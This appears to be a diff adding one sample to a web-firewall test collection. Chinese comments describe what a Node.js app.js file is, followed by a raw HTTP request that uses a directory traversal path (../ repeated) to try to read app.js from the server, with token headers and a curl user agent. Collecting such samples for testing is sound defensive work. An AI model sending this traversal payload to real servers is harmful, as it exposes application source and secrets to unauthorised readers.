@@ -1,0 +1,11 @@
+# 目录遍历_app.js
+# app.js通常是指Node.js应用程序中的主要JavaScript文件。在Node.js中，app.js文件通常包含应用程序的入口点，它会启动一个HTTP服务器并监听来自客户端的请求。
+# 
+# 在app.js文件中，通常会使用Node.js的内置模块或第三方模块来处理HTTP请求和响应，以及执行其他应用程序逻辑。
+GET /../../../../../../../../../../../app.js?acid=80050820&bid=hd_tag_m8mv24ku HTTP/1.1
+Host: www.swaf.com
+RM-PRO-BusinessID: hd_tag_m8mv24ku
+RM-PRO-Token: 2445674c7cdac578de77dac6671d8bf9
+RM-PRO-Time: 1742808389149
+User-Agent: curl/7.83.1
+
